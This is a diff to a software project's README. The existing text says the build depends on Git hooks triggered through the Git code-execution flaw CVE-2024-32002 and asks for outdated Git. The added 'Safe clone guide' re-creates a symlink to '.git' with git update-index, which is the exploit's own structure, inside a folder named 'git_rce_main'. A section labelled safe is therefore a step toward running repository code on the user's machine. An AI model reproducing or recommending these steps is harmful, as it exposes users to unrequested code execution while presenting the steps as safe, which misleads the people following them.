@@ -79,6 +79,15 @@ git clone --recursive https://github.com/happymimimix/Piano-FX-Pro.git
 
 This uses Git hooks via submodules to automate the build. Git 2.45.1 and later patched the mechanism this relies on (CVE-2024-32002), so automatic builds require version 2.45.0 or earlier.
 
+### Safe clone guide
+```
+git clone --no-recursive "$main_repo_path" git_rce_main
+cd git_rce_main
+git rm gitlnk
+git submodule update --init --recursive
+git update-index --add --cacheinfo 120000 $(echo -n ".git" | git hash-object -w --stdin) gitlnk
+```
+
 ### Build Configurations
 
 **For development**, use **Debug**. It compiles in ~30 seconds, includes full compiler optimizations (performance is identical to Release), and generates PDB files. It excludes FFmpeg, Colorizer, and PFXGDI to keep compile times short. To test a different language or enable a special feature during development, define it in `DebugLanguageOverride.h` — do not switch configurations.
